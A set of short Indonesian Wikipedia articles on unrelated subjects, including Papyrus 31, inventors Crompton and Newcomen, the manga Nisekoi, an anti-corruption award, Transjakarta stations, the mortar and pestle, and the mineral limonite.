<doc id="1753594" url="https://id.wikipedia.org/wiki?curid=1753594" title="Papirus 31">
Papirus 31

Papirus 31 (; dalam penomoran Gregory-Aland diberi kode formula_1) adalah sebuah naskah papirus kuno berisi bagian Perjanjian Baru dari Alkitab Kristen dalam bahasa Yunani. Memuat potongan Surat Roma. Yang terlestarikan hanya pasal 5:3-8. Berdasarkan paleografi diperkirakan naskah ini dibuat pada abad ke-7. Salah satu sisi halamannya kosong. Hunt menduga naskah ini merupakan sebuah leksionari.

Ditulis dalam huruf-huruf uncial ukuran sedang melandai. Tampaknya disalin untuk pembacaan di gereja.

Naskah Yunani kodeks ini tergolong jenis Teks Alexandria. Aland menempatkannya dalam Kategori II. Bersesuaian dengan Codex Sinaiticus.

Saat ini disimpan bersama dengan Papirus 52 Rylands pada John Rylands University Library (Gr. P. 4) di Manchester, Britania Raya.




</doc>
<doc id="1753601" url="https://id.wikipedia.org/wiki?curid=1753601" title="Samuel Crompton">
Samuel Crompton

Samuel Crompton (3 Desember 1753 – 26 Juni 1827) adalah pengusaha asal Britania Raya yang dikenal sebagai penemu dan pengusaha di Industri mesin tenun. Mesin tersebut ia kembangkan dengan basis karya James Hargreaves dan Richard Arkwright. Ciptaannya tersebut kemudian merevolusi industri tenun di seluruh dunia.

Samuel Crompton lahir di 10 Firwood Fold, Bolton, Lancashire. Ayahnya bernama George Cromptom dan ibunya bernama Betty Crompton. Ia memiliki dua adik perempuan. Ayahnya wafat sejak ia masih kecil sehingga ia terpaksa bekerja sebagai penenun. Namun, ia merasa alat yang digunakannya tidak efesien sehingga ia mencari cara membuatnya bekerja lebih baik. Selama lima atau enam tahun ia mencoba berbagai metode untuk itu dan akhirnya menemukannya setelah berkorban baik waktu maupun uang. Ia membiayai penelitiannya ini sendiri dengan bermain biola di teater Bolton.




</doc>
<doc id="1753602" url="https://id.wikipedia.org/wiki?curid=1753602" title="Thomas Newcomen">
Thomas Newcomen

Thomas Newcomen (Februari 1664 – 5 Agustus 1729) adalah pengusaha dan penemu asal Britania Raya yang dikenal sebagai penemu mesin uap untuk memompa air yang diberi nama mesin uap Newcomen. Selain sebagai penemu, ia juga aktif menjadi pendeta di gerejanya.

Ia lahir dari keluarga pedagang di Dartmouth, Devon, Inggris, dan dibaptis di St. Saviour's Cruch pada tanggal 24 Februari 1664. Kala itu, banjir menjadi masalah besar di pertambangan batu bara dan timah. Melihat ini, Newcomen tergerak untuk menemukan cara memompa air dari tambang-tambang tersebut. Setelah berhasil, ia menjualnya dan membangun bisnis yang fokus pada penjualan alat-alat pertambangan.




</doc>
<doc id="1753603" url="https://id.wikipedia.org/wiki?curid=1753603" title="Claus Spreckels">
Claus Spreckels

Claus Spreckels (9 Juli 1828 - 26 Desember 1908) sebagai pendiri Spreckles Sugar Company. Spreckles juga menjadi presiden San Francisco and San Juaquin Valley Railway dari 1895 hingga perusahaan dijual ke Santa Fe Railway pada tahun 1901.

Spreckles lahir di Lamstedt, Hanover, yang kini masuk dalam wilayah negara Jerman. Pada tahun 1846, ia bermigrasi ke Amerika Serikat dan menikah pada tahun 1852 dengan teman masa kecilnya, Anna Christina Mangels (1829-1910). Pasangan ini memiliki tiga belas anak dan lima di antaranya bertahan hidup hingga dewasa: John Diedrich (1853-1926), Adolph Bernard (1857-1924), Claus August (1858-1946), Rudolph (1872-1958) dan seorang putri, Emma C. Spreckels.




</doc>
<doc id="1753604" url="https://id.wikipedia.org/wiki?curid=1753604" title="Biddy Mason">
Biddy Mason

Biddy Mason (15 Agustus 1818 di Hancock County, Georgia – 15 Januari 1891, di Los Angeles, California) adalah seorang pengusaha asal Amerika Serikat yang dikenal sebagai seorang budak yang sukses menjadi pengusaha real-estate dan filantropis di Amerika Serikat. Ia juga merupakan pendiri First African Methodist Episcopal, gereja kulit hitam pertama di Los Angeles, dan menyumbangkan tanahnya untuk pembangunan gereja.

Ia lahir sebagai seorang budak di Georgia. Setelah dibebaskan pada tahun 1856, ia bekerja sebagai suster dan asisten rumah tangga. Dari pendapatannya tersebut ia menabung dan berhasil membeli tanah di Los Angeles, menjadikannya orang kulit hitam pertama yang memiliki tanah di kota tersebut. Ia kemudian menjadi pengusaha dengan total kekayaan mencapai $300.000 dan dikenal dermawan dalam membagikan hartanya untuk kegiatan amal. Ia dapat berbicara bahasa Spanyol dengan lancar dan merupakan seorang tokoh yang sangat dikenal di kotanya.




</doc>
<doc id="1753605" url="https://id.wikipedia.org/wiki?curid=1753605" title="Nisekoi: False Love">
Nisekoi: False Love

, yang diterbitkan di Indonesia dengan judul Nisekoi: False Love, adalah sebuah seri manga Jepang bergenre komedi romantis yang ditulis dan diilustrasikan oleh Naoshi Komi. "Nisekoi" pertama kali diterbitkan sebagai manga tunggal di majalah musiman "Jump NEXT!" terbitan Shueisha sebelum mulai diserialisasikan di majalah "Weekly Shōnen Jump". Sejak tanggal 26 November 2012, "Nisekoi" telah diterbitkan dalam bahasa Inggris di majalah digital milik Viz Media, "Weekly Shonen Jump". Hingga bulan Oktober 2016, seri ini telah dibundel menjadi 25 volume "tankōbon" di Jepang, dan juga diterbitkan dalam bahasa Inggris dalam bentuk digital dan volume cetak oleh Viz Media. Manga ini juga telah menginspirasi sebuah seri novel, berjudul "Nisekoi: Urabana", yang ditulis oleh Hajime Tanaka dan diterbitkan oleh Shueisha. Dua volume telah diterbitkan sejauh ini, pada tanggal 4 Juni dan 28 Desember 2013.

Pada bulan Mei 2013, diumumkan bahwa adaptasi anime untuk "Nisekoi" telah mendapatkan lampu hijau. Versi animenya disutradarai oleh Akiyuki Shinbo di Shaft, dan tayang sejak tanggal 11 Januari hingga 24 Mei 2014. Aniplex of America telah melisensi seri ini untuk hak "streaming" dan distribusi video rumahan di Amerika Utara. Daisuki, Crunchyroll, dan Hulu menyediakan siaran serentak secara "simulcast" dengan subtitel bahasa Inggris untuk khalayak di Amerika Serikat, Kanada, Amerika Selatan dan Afrika Selatan. Musim kedua berjudul "Nisekoi:" tayang sejak bulan April hingga Juni 2015. Sebuah adaptasi berupa film laga hidup ("live-action") telah diumumkan.

Pada awal semester 1 kelas 10, seorang perempuan yang terlambat menabrak Raku, melukai hidungnya dan menjatuhkan liontinnya yang hilang di rerumputan. Raku yang kesal pun bercerita tentang tabrakan itu kepada kedua temannya, Shū Maiko dan Kosaki Onodera, yang memberi perban di hidung Raku. Saat pelajaran dimulai, guru kelas mereka, Kyoko mengumumkan datangnya murid baru dari Amerika Serikat, Chitoge Kirisaki, gadis berambut pirang yang menabrak Raku tadi pagi. Seketika, Raku langsung memarahi Chitoge karena menabraknya tadi pagi, tetapi Kyoko menganggap mereka sudah saling kenal dan menugaskan Raku untuk mengenalkan gedung SMA Bonyari kepada Chitoge. Saat Raku menyadari liontinnya telah hilang, ia langsung memarahi Chitoge lagi, meminta pertanggungjawaban atas kehilangan tersebut. Chitoge pun akhirnya berjanji akan mencarikan liontin Raku sampai dapat, kemudian mereka tak akan pernah berbicara lagi. Singkat cerita, rumor pun menyebar bahwa Raku dan Chitoge berpacaran, membuat mereka kesal dan semakin cepat mencarinya.

Tetapi pada suatu hari, Chitoge marah karena capek dan menganggap remeh janji tentang liontin itu dan menganggap benda itu tak penting lagi. Karena rasa kesal yang terpendam, Raku pun membentak Chitoge, dengan Kosaki berdiri tepat di belakangnya, untuk tidak usah membantu kalau tidak ingin. Esoknya, Raku tidak bertemu Chitoge di taman, tetapi Raku melihat seseorang melemparkan sesuatu yang melesat terbang, kemudian menghantam wajah Raku dengan keras. Ternyata orang itu adalah Chitoge, yang mencari liontin itu kemarin setelah Raku memarahinya, dan barang itu adalah liontinnya. Ketika pulang, Raku berbicara kepada ayahnya tentang perang geng yang terjadi akhir-akhir ini sejak kedatangan Chitoge, ternyata kelompok gangster dari luar negeri menggangu wilayah yakuza dan memulai perang, mendesak yakuza dengan persenjataan yang lebih unggul. Ayah Raku mendesaknya agar mau dijodohkan dengan putri pemimpin gangster tersebut, setidaknya hanya berpura-pura pacaran agar menghentikan perang kedua geng tersebut, tetapi ketika Raku mendengar suara perempuan itu, ternyata ia adalah Chitoge.

Tokoh utama Nisekoi, putra dari pemimpin kelompok Yakuza Shuei-Gumi. Sangat ahli dalam memasak, dan biasa membuatkan makan para anggota yakuzanya. Memiliki liontin dengan lubang kunci di tengahnya.Putri pemimpin Gangster Beehive dari Amerika Serikat, terpaksa menjadi pacar Raku agar kedua geng mereka tidak berperang lagi. Seringkali membuat hal yang aneh ketika memasak makanan sederhana sekalipun. Memiliki kunci panjang berlambangkan bulan sabit di ujungnya.Teman sekelas Raku, yang sejak SMP menyukai Raku, tetapi malu untuk mengungkapkan perasaanya. Ahli dalam menghias makanan, tetapi sangat gagal dalam hal memasak. Memiliki kunci panjang berlambangkan salib di ujungnya.Anggota Beehive yang dikirim oleh Claude untuk mengawasi Raku dan Chitoge, tetapi akhirnya jatuh cinta kepada Raku setelah hampir tenggelam di kolam renang sekolah. Terungkap bahwa Tsugumi adalah teman masa kecil Chitoge yang diadopsi Claude, yang memberinya nama depan laki-laki karena penampilannya yang tomboi. Mempunyai keahlian senjata dan fisik yang hebat, ahli memasak dan menyanyi, bahkan pernah membuat teman-teman sekelasnya merasa tenang setelah mendengar Yui bernyanyi. Sering menjadi korban dari alat-alat dan eksperimen Beehive.Putri Komisaris Kepolisian Tachibana, dan mengaku sebagai tunangan dari Raku. Sangat pandai memasak dan menyiapkan makanan, terutama makanan mentah seperti sushi dan sashimi. Mempunyai burung beo yang ia namai Raku-sama, seperti nama orang yang memberinya semangat dan alasan untuk hidup ketika ia sakit saat berumur 6 tahun. Memiliki kunci pendek berlambangkan hati di ujungnya.Pemimpin Mafia Tiongkok Char Siu, saat kecil sudah yatim piatu dan dirawat bersama Raku seperti saudara, meskipun Yui 2 tahun lebih tua. Muncul pada Tahun Kedua sebagai guru kelas Raku, karena sangat pandai sehingga bisa lulus lebih awal. Sangat buruk dalam menyanyi, tetapi sangat pandai dalam mengajari murid-muridnya. Memiliki kunci panjang yang ujungnya patah.Sahabat Raku dari SD, ia ekspresif dan mesum, tetapi pengertian dan baik. Sering dihajar oleh Ruri karena perilaku mesumnya, hobi fotografi "candid" dan sering menggoda Ruri, menganggapnya sebagai 'Sobat Kacamata'.Sahabat Kosaki dari SMP, dan selalu mendukungnya agar segera menyatakan perasaannya kepada Raku. Sering menghajar Shū karena perilakunya, tetapi akhirnya menyukainya pada Tahun Kedua karena kebaikan Shū yang seringkali tidak terduga dan terselubung.Salah satu pemimpin Beehive dan pengawal Chitoge, sangat protektif terhadapnya dan satu-satunya anggota dari kedua kelompok yang berusaha menyelidiki keaslian hubungan Raku dan Chitoge.Teman dekat dan mantan rekan satu profesi dengan Tsugumi, muncul pada Tahun Kedua. Ia takut dengan hal horor, jarum suntik dan tidak menyukai sayuran.Adik Kosaki yang muncul pada Tahun Kedua, masuk ke SMA Bonyari sebagai siswi kelas 10. Selalu berusaha menjadikan Paula sebagai teman, tetapi hampir semua usahanya gagal. / Sahabat dan teman sekelas Haru dari SMP.

"Nisekoi" dikarang dan diilustrasikan oleh Naoshi Komi yang berawal dari sebuah manga one-shot, diterbitkan di majalah Shūeisha pada 8 Januari 2011 dan diserialisasikan pada 21 November 2011 di majalah Shūeisha Weekly Shonen Jump. Manga ini telah dilisensikan di Indonesia oleh Elex Media Komputindo dan mulai diterbitkan pada 19 Oktober 2016 dengan judul "Nisekoi: False Love."

Lagu ClariS, ""CLICK"", menjadi lagu pembukaan pertama Nisekoi dari episode 2 sampai 14 dan menjadi lagu penutup episode pertama. Pada episode 15 sampai 19, lagu ClariS yang lain, ""STEP"" menjadi lagu pembukaan kedua. Lagu penutup episode kedua sampai 8 adalah ""Heart Pattern"" yang dinyanyikan oleh Nao Toyama, sedangkan lagu Kana Hanazawa, ""Recover Decoration"" menutup episode 10 sampai 15. Pada episode 17, Mikako Komatsu dengan lagunya ""Trick Box"" menjadi lagu penutup ketiga, sedangkan dari episode 18 sampai episode 19, lagu Kana Asumi, ""Hanagonomi"" menjadi lagu penutup keempat. Keempat pengisi suara karakter perempuan, Kana Hanazawa, Nao Toyama, Mikako Komatsu dan Kana Asumi mengisi lagu penutup episode 20 dan ketiga OVA dengan lagu bersama mereka, ""Souzou Diary"".

LiSA dengan lagunya, ""Rally Go Round"" menjadi lagu pembuka dari episode 1, sementara ""Aimai Hertz"", yang dinyanyikan oleh penyanyi lagi Souzou Diary menjadi lagu penutup dari episode 1.



</doc>
<doc id="1753613" url="https://id.wikipedia.org/wiki?curid=1753613" title="Bung Hatta Award">
Bung Hatta Award

Bung Hatta Anti-Corruption Award (BHACA) atau lebih dikenal dengan sebutan Bung Hatta Award adalah ajang penganugerahan penghargaan bagi insan Indonesia yang dikenal oleh lingkungan terdekatnya sebagai pribadi-pribadi yang bersih dari praktik korupsi, tidak pernah menyalahgunakan kekuasaan atau jabatannya, menyuap atau menerima suap, dan berperan aktif memberikan inspirasi atau mempengaruhi masyarakat atau lingkungannya dalam pemberantasan korupsi. Bung Hatta Award diselenggarakan oleh Perkumpulan BHACA yang berdiri pada 9 April 2003.

Perkumpulan BHACA (Bung Hatta Anti-Corruption Award) adalah komunitas yang sadar mengenai bahaya-bahaya korupsi bagi kelangsungan hidup bermasyarakat dan berbangsa. Dengan semangat dan tekad, perkumpulan ini mengajak masyarakat luas untuk berpartisipasi memberikan dorongan, pemberdayaan, dan perlindungan bagi mereka yang telah berjuang melawan praktik korupsi serta mengupayakan perubahan itu. Nama Bung Hatta dipilih karena merupakan figur bapak bangsa yang memberikan teladan perilaku jujur, baik dalam hubungan pemerintahan maupun dalam kehidupan sehari-hari. Sepanjang hidupnya, Bung Hatta juga tak pernah berhenti melawan setiap bentuk penyimpangan kekuasaan, meskipun harus menghadapi risiko tidak ringan.

Penganugerahan penghargaan BHACA dilakukan setiap dua tahun sekali, yaitu pada setiap Hari Sumpah Pemuda tanggal 28 Oktober. Periode penjaringan calon penerima penghargaan setiap tahunnya dimulai pada bulan Maret. Syarat utama penerima BHACA adalah mereka yang dikenal oleh lingkungan terdekatnya sebagai pribadi-pribadi yang bersih dari praktik korupsi, tidak pemah menyalahgunakan kekuasaan atau jabatannya, menyuap atau menerima suap, berperan aktif, memberikan inspirasi atau mempengaruhi masyarakat atau lingkungannya dalam pemberantasan korupsi. Pada setiap tahun pemberian Bung Hatta Anti-Corruption Award, Steering Committee akan menentukan sektor mana saja yang akan menjadi fokus penyeleksian. Penilaian dilakukan oleh Tim Juri yang akan dipilih dan diangkat oleh Anggota Steering Committee dari unsur masyarakat bisnis, pemerintah, dan "civil society" yang cakap menjalankan tugasnya. Setiap tahun komposisi anggota Tim Juri dapat berubah-ubah, disesuaikan dengan kesanggupan dan kebutuhan. Berikut adalah tahapan-tahapannya:


Pendanaan untuk pelaksanaan kegiatan ini sepenuhnya digalang dari masyarakat secara pribadi. Hal ini dimaksudkan agar penghargaan ini benar-benar datang dari masyarakat, bukan dari perusahaan-perusahaan atau lembaga. Setiap pemasukan dan pengeluaraan sumbangan akan diaudit oleh akuntan publik dan dilaporkan secara periodik, sesuai dengan prinsip transparansi dan akuntabilitas.


</doc>
<doc id="1753616" url="https://id.wikipedia.org/wiki?curid=1753616" title="Slipi Kemanggisan (Transjakarta)">
Slipi Kemanggisan (Transjakarta)

Slipi Kemanggisan adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen S. Parman, Kemanggisan, Palmerah, Jakarta Barat. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta.



</doc>
<doc id="1753617" url="https://id.wikipedia.org/wiki?curid=1753617" title="Dadang Hawari">
Dadang Hawari

Dadang Hawari () adalah psikiater berkebangsaan Indonesia. Dia kerap menjadi narasumber berbagai media massa nasional untuk berbagai kasus dari tinjauan psikologi. Dia adalah sosok yang tidak asing lagi di kalangan pemerintahan, ilmuwan, agamawan, dan juga masyarakat awam. Aktivitasnya beragam, mulai psikiater, mengisi ceramah masalah kesehatan, hingga meniti karier akademisnya menjadi Guru Besar Tetap di Fakultas Kedokteran Universitas Indonesia.


</doc>
<doc id="1753618" url="https://id.wikipedia.org/wiki?curid=1753618" title="Chonlatit Jantakam">
Chonlatit Jantakam

Chonlatit Jantakam (, ) adalah seorang pemain sepak bola Thailand. Ia dapat berposisi sebagai bek tengah ataupun bek kanan. Saat ini ia bermain untuk Chonburi dan pernah pula untuk .

Chonlatit Jantakam telah bermain untuk Chonburi sejak 2004 hingga saat ini. Total ia telah tampil 264 kali dan mencetak 5 gol.

Chonlatit Jantakam telah bermain 45 kali untuk , tetapi belum mencetak gol.

Ia pertama kali dipanggil oleh pelatih Peter Reid bersama 35 pemain lain untuk turnamen Piala T&T 2008 di Vietnam.


</doc>
<doc id="1753620" url="https://id.wikipedia.org/wiki?curid=1753620" title="Cobek dan ulekan">
Cobek dan ulekan

Cobek dan ulekan adalah sepasang alat yang telah digunakan sejak zaman purbakala untuk menumbuk, menggiling, melumat, mengulek, dan mencampur bahan-bahan tertentu (misalnya bumbu dapur, rempah-rempah, jamu, atau obat-obatan). Istilah cobek merujuk kepada sejenis mangkuk sebagai alas untuk kegiatan menumbuk atau mengulek, sementara ulekan merujuk kepada benda tumpul memanjang seperti pentungan yang dapat digenggam tangan untuk menumbuk atau mengulek suatu bahan. Baik cobek ataupun ulekan biasanya dibuat dari bahan yang keras, misalnya kayu keras, batu, keramik, atau logam.

Cobek dan ulekan telah lama digunakan sebagai alat dapur dalam proses masak-memasak hingga kini.

Dalam Bahasa Inggris, cobek dan ulekan disebut "mortar and pestle". Cobek dan ulekan dikenal dalam berbagai nama di Indonesia.
Dalam Bahasa Sunda, Cobek lebih dikenal dengan sebutan "coét" atau "cowét"; dalam Bahasa Jawa disebut "cowek" atau "coek". Sementara ulekan dalam Bahasa Sunda disebut "mutu", sementara dalam Bahasa Jawa disebut "muthu", "uleg-uleg" atau "ulegan".

Di Indonesia, cobek dan ulekan adalah alat yang penting dalam kegiatan masak-memasak rumah tangga. Sebagai contoh, cobek dan ulekan adalah alat penting untuk mengulek dan melumat bumbu dapur, dan membuat masakan khusus, seperti sambal ulek atau sambal terasi, menghaluskan dan mencampur bumbu gado-gado, dan menyajikan ayam penyet atau iga penyet.

Bentuk dan ukuran cobek dan ulekan beraneka ragam sesuai kebutuhan penggunanya. Cobek kecil (diameter 8-13 cm) biasanya untuk penyajian sambal secara perseorangan di rumah makan, sementara yang berukuran sedang (diameter 15-20 cm) untuk penggunaan rumah tangga. Sementara cobek berukuran besar (diameter 30-40 cm) dan agak datar biasanya digunakan oleh penjual gado-gado atau warung makan yang menyajikan hidangan sambal yang dibuat dalam jumlah besar.

Tingkat kecekungan cobek dapat berbeda-beda, ada yang dalam menyerupai mangkuk atau lumpang, ada pula yang datar. Ulekan pun memiliki bentuk yang berbeda-beda, paling lazim adalah bulat panjang dangan cara menggenggam seperti menggenggam pistol. Akan tetapi ada pula ulekan yang berbentuk bulat sesuai genggaman tangan untuk menumbuk, ada pula yang berbentuk silinder untuk menggiling. Cobek dan ulekan yang unik ini biasanya digunakan untuk membuat jamu.

Baik cobek ataupun ulekan biasanya dibuat dari bahan yang keras, misalnya kayu keras, batu, keramik, atau logam (kuningan atau baja antikarat). Di Indonesia biasanya bahan yang lazim digunakan adalah batu alam, batu kali, atau batu andesit (batu vulkanik gunung berapi). Beberapa daerah di Indonesia adalah sentra pengrajin cobek dan ulekan batu, salah satunya adalah daerah Muntilan, Kabupaten Magelang, Jawa Tengah, dekat Candi Borobudur.

Cobek dan ulekan keramik juga lazim digunakan apoteker untuk melumat dan mencampur bahan obat-obatan dalam kegiatan farmasi.

Cobek dan ulekan tertua telah digunakan manusia sejak kurun 35,000 tahun SM. Alat ini adalah salah satu alat tertua yang digunakan manusia sejak zaman batu. Beberapa temuan arkeologi menunjukkan benda-benda batu yang digunakan sebagai alat untuk menumbuk. Sebagai contoh, artefak batu yang ditemukan di Yunani dari kurun 3200 sampai 2800 SM, menunjukkan alat untuk mengekstraksi atau menumbuk zat pigmen pewarna yang diambil dari batu-batuan.

Benda lain yang mirip cobek dan ulekan, atau bekerja sesuai prinsip yang sama, adalah lesung atau lumpang dan alu. Akan tetapi lesung dan alu berukuran lebih besar, biasanya memanjang, dan digunakan untuk menumbuk padi.




</doc>
<doc id="1753624" url="https://id.wikipedia.org/wiki?curid=1753624" title="RS Harapan Kita (Transjakarta)">
RS Harapan Kita (Transjakarta)

RS Harapan Kita adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen S. Parman, Kota Bambu, Palmerah, Jakarta Barat. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini berasal dari Rumah Sakit Harapan Kita yang terletak di sebelah timur stasiun




</doc>
<doc id="1753632" url="https://id.wikipedia.org/wiki?curid=1753632" title="Cocacolonisasi">
Cocacolonisasi

Cocacolonisasi (atau coca-colonisasi) adalah istilah yang merujuk pada globalisasi atau kolonisasi budaya. Cocacolonisasi merupakan gabungan nama perusahaan minuman ringan multinasional Coca-Cola dan kata "kolonisasi".

Istilah ini digunakan untuk menjelaskan importasi/penyebaran produk Barat (terutama Amerika Serikat) atau percampuran nilai budaya Barat (khususnya Amerika Serikat) yang bersaing dengan kebudayaan setempat. Walaupun bisa dipakai secara halus, kata ini sering dipakai secara merendahkan untuk menyamakan globalisasi dengan Westernisasi atau Amerikanisasi. Misalnya, menurut bahasawan Ghil'ad Zuckermann, "dengan globalisasi, homogenisasi, dan coca-colonisasi, semakin banyak kelompok yang masuk golongan orang-orang tanpa warisan [kebudayaan]."

Istilah ini sudah dipakai sejak tahun 1949. Kata ini diketahui pernah digunakan dalam peringatan pers komunis Prancis pada tahun itu. Pada tahun 1961, majalah "Time" menggunakan kata ini dalam tinjauan "One, Two, Three" karya Billy Wilder: ""yell-mell, hard-sell, Sennett-with-a-sound-track satire of iron curtains and color lines, of people's demockeracy, Coca-Colonization, peaceful nonexistence, and the Deep Southern concept that all facilities are created separate but equal"."

Istilah ini mulai masuk perdebatan Amerikanisasi Eropa melalui buku Reinhold Wagnleitner, "Coca-Colonization and the Cold War: The Cultural Mission of the United States in Austria After the Second World War", yang diterbitkan tahun 1994. Istilah ini juga menjadi ciri khas gerakan anti-globalisasi.

Selain itu, cocacolonisasi digunakan dalam tulisan-tulisan kedokteran untuk menjelaskan perubahan gaya hidup dan peningkatan jumlah penderita penyakit kronis, e.g. diabetes tipe 2.




</doc>
<doc id="1753641" url="https://id.wikipedia.org/wiki?curid=1753641" title="Once Upon a Time in Mumbaai">
Once Upon a Time in Mumbaai

Once Upon a Time in Mumbaai adalah sebuah film gangster periode India 2010 yang disutradarai oleh Milan Luthria dan diprodukdi oleh Ekta Kapoor. Film tersebut dibintangi oleh Ajay Devgan, Emraan Hashmi, Prachi Desai, Kangna Ranaut dan Randeep Hooda. Film tersebut dibawah spanduk Balaji Motion Pictures dan dirilis pada 30 Juli 2010. "Once Upon A Time in Mumbaai" mendapatkan sambutan campuran sampai positif dari kritikus dan dideklarasikan sebagai sebuah hit box office.

Sekuelnya, "Once Upon ay Time in Mumbai Dobaara!", dirilis pada 15 Agustus 2013, Hari Kemerdekaan. Film tersebut menampilkan Akshay Kumar menggantikan Hashmi dari film pertamanya bersama dengan Imran Khan. Pemfilman untuk sekuelnya dimulai pada Agustus 2012 dan dilakukan di Qatar. Disamping pandangan campuran dari kritikus dan penonton, sekuel tersebut menjadi sebuah flop box office.


Soundtrack film tersebut dirilis pada 28 Juni 2010. Musiknya dikomposisikan oleh Pritam dan lirik-liriknya ditulis oleh Irshad Kamil, Neelesh Misra dan Amitabh Bhattacharya.

Karena keberhasilan secara kritis dan komersial dari film tersebut, sebuah sekuel direncanakan. Akshay Kumar dan Imran Khan menjadi pemeran laki-laki utama. Sekuel tersebut, "Once Upon Ay Time in Mumbai Dobaara!", menampilkan Sonakshi Sinha yang memerankan peran aktris Mandakini. Film tersebut memulai pengambilan gambar pada Agustus 2012, sementara film tersebut dirilis pada 15 Agustus 2013, yang berbenturan dengan penayangan sebuah film yang disutradarai oleh Rohit Shetty yang bernama "Chennai Express", yang dibintangi oleh Shah Rukh Khan dan Deepika Padukone, yang dirilis seminggu sebelum perilisan "OUATIMD".



</doc>
<doc id="1753692" url="https://id.wikipedia.org/wiki?curid=1753692" title="5 Srigala">
5 Srigala

5 Srigala adalah sebuah grup vokal dangdut asal Indonesia. Grup vokal tersebut dibentuk dari para mantan personel Tiga Macan dan Trio Macan. Berbeda dengan grupnya terdahulu di Trio Macan dan Tiga Macan, personel 5 Srigala terdiri dari lima orang yang terdiri dari Lia, Ayu, Riza, Angel dan Dian. Ayu dan Riza merupakan rekan Lia saat membentuk Tiga Macan. Sedangkan Dian merupakan bekas rekan Lia di formasi awal Trio Macan dulu. Singel pertama 5 Srigala berjudul "Abah Emak". Karena ingin keluar dari bayangan grup mereka terdahulu, 5 Srigala mengusung musik bernuansa Timur Tengah.

Salah satu lagu dari grup tersebut yang berjudul "Gara-Gara Dia", yang awalnya bernama "Gara-Gara Dangdut", dijadikan soundtrack sinetron dengan judul yang sama.

Duo Sony Zillo mengaku kesal kepada grup Srigala. Pasalnya, grup yang dikomandoi Lia Ladysta itu dianggap menjiplak lagu mereka berjudul "Mendadak Seleb". Namun, di tangan Srigala judul lagu itu diubah menjadi "Selebritis Narsis". Padahal, Sony Zillo yang beranggotakan Sony D'Rickson dan Zillo D'Matrick sudah mempopulerkan lagu tersebut sejak April 2013.


</doc>
<doc id="1753805" url="https://id.wikipedia.org/wiki?curid=1753805" title="Limonit">
Limonit

Limonit, kadang juga disebut bijih nikel berkadar rendah, adalah bijih besi yang terdiri dari campuran besi(III) oksida-hidroksida terhidrasi dalam berbagai komposisi. Rumus kimianya umum ditulis sebagai FeO(OH)·nHO, meskipun tidak sepenuhnya akurat kareana rasio oksida terhadap hidroksidanya dapat bervariasi cukup besar. Limonit adalah salah satu dari dua bijih besi utama (selainnya adalah hematit), dan limonit telah ditambang untuk produksi besi setidaknya sejak 2500 SM.

Nama Limonit diambil dari kata 'padang rumput' (λειμών) dalam bahasa Yunani, yang merujuk pada bijih besi rawa ("bog iron ore") yang ditemukan di padang rumput dan rawa-rawa. Dalam warnanya yang cokelat ia kadang-kadang disebut "hematit coklat" atau "bijih besi coklat", sedangkan dalam bentuk warnanya yang kuning terang ia kadang-kadang disebut "batu lemon" atau "bijih besi kuning".

Limonit secara relatif cukup padat, dengan gravitasi spesifik yang antara 2,7-4,3. Variasi dalam warna berkisar dari kuning lemon cerah hingga cokelat buram keabu-abuan. Jalur limonit pada piring porselen yang belum diglasir selalu berwarna kecoklatan, suatu karakter yang membedakannya dengan hematit yang menimbulkan jalur merah, atau dari magnetit yang menimbulkan jalur hitam. Tingkat kekerasannya berbeda-beda, tetapi umumnya dalam kisaran 4-5,5.

Meskipun awalnya digolongkan sebagai mineral tunggal, limonit sekarang digolongkan sebagai campuran mineral besi oksida terhidrasi yang terkait, antara lain goetit, akaganeit, lepidokrosit, dan jarosit. Mineral-mineral tersebut dalam limonit dapat membentuk kristal, namun limonitnya sendiri tidak, meskipun terdapat spesimen yang menunjukkan suatu struktur berserat atau mikrokristalin, dan limonit sering terjadi dalam bentuk konkresi atau gumpalan padat dan bertanah; kadang-kadang bentuknya mamilar, bergugus (bitrioidal), mengginjal (reniform), atau stalaktit.

Karena bersifat amorf serta terjadi di daerah yang terhidrasi, limonit sering muncul sebagai tanah liat atau batu lempung. Meskipun demikian ada pula limonit bentuk semu (pseudomorf) yang menyerupai mineral lainnya, misalnya pirit. Ini berarti bahwa pelapukan kimia mengubah kristal pirit menjadi limonit dengan cara menghidrasi molekulnya, namun bentuk eksternal dari kristal pirit tidak berubah. Limonit pseudomorf juga dapat terbentuk dari oksida besi lainnya yaitu hematit dan magnetit; atau dari siderit karbonat dan dari besi yang kaya silikat seperti garnet almandin.

Limonit biasanya terbentuk dari hidrasi hematit dan magnetit, dari oksidasi dan hidrasi mineral sulfida yang kaya besi, dan dari pelapukan kimia mineral lainnya yang kaya besi, seperti olivin, piroksen, amfibol, dan biotit. Limonit seringkali merupakan komponen besi terbesar dalam tanah laterit. Ia juga sering terdeposit pada jalur-jalur limpahan air dari operasi pertambangan.

Salah satu kegunaan awal limonit adalah sebagai pigmen. Limonit kuning menghasilkan warna kuning oker yang terkenal dihasilkan di Siprus; sedangkan limonit yang lebih gelap menghasilkan warna-warna tanah. Pemanggangan mengubah limonit akan mengubah sebagiannya menjadi hematit, yang menghasilkan warna-warna merah oker, umber terbakar, dan siena.

Bijih besi rawa dan batu lempung limonit dapat ditambang sebagai sumber besi, meskipun pertambangan komersial untuk keduanya sudah tidak dilakukan lagi di Amerika Serikat.

Gosan dari besi oksida yang mengandung silika biasanya terbentuk sebagai hasil dari oksidasi intensif pada deposit bijih sulfida. Gosan ini digunakan oleh prospektor tambang sebagai panduan mencari bijih. Selain itu, apabila oksidasi deposit sulfida tersebut mengandung emas, biasanya menjadi petunjuk adanya konsentrasi emas pada besi oksida dan kuarsa dari gosan. Gosan limonit yang mengandung emas secara produktif ditambang di distrik Shasta County, Kalifornia.

Deposit serupa juga ditambang dekat Rio Tinto di Spanyol dan Mount Morgan di Australia. Di jalur emas Dahlonega di Lumpkin County, Georgia, emas ditambang dari tanah laterit atau tanah saprolit yang kaya dengan limonit. Emas dari urat-urat utama terkonsentrasi dalam limonit pada bebatuan yang sangat lapuk. Dalam contoh lainnya, formasi besi yang sangat lapuk di Brasil menjadi petunjuk pada konsentrasi emas yang mengandung limonit pada tanahnya.

